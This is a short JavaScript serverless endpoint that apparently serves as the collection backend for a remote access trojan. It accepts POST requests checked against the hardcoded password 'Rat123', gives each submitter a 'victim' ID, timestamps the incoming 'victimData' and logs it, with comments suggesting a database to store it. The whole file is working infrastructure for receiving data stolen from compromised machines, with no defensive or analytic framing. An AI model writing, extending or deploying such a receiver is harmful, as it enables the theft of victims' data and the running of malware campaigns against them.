// api/data.js
export default function handler(req, res) {
    // Set CORS headers
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, X-Password');

    // Handle preflight request
    if (req.method === 'OPTIONS') {
        res.status(200).end();
        return;
    }

    // Only accept POST requests
    if (req.method !== 'POST') {
        res.status(405).json({ error: 'Method not allowed' });
        return;
    }

    try {
        const { password, data } = req.body;

        // Check password
        if (password !== "Rat123") {
            res.status(401).json({ error: 'Unauthorized' });
            return;
        }

        // Generate unique ID for this victim
        const victimId = Date.now() + '-' + Math.random().toString(36).substr(2, 9);
        
        // Add timestamp
        const victimData = {
            id: victimId,
            timestamp: new Date().toISOString(),
            ...data
        };

        // Here you would typically save to a database
        // For demo, we'll log to console and return
        console.log('Victim data received:', JSON.stringify(victimData, null, 2));

        // You could also save to a file (but Vercel is stateless)
        // Better to use a database like MongoDB, Supabase, etc.

        res.status(200).json({ 
            status: 'success',
            message: 'Data received',
            victim_id: victimId
        });

    } catch (error) {
        console.error('Error processing data:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
}
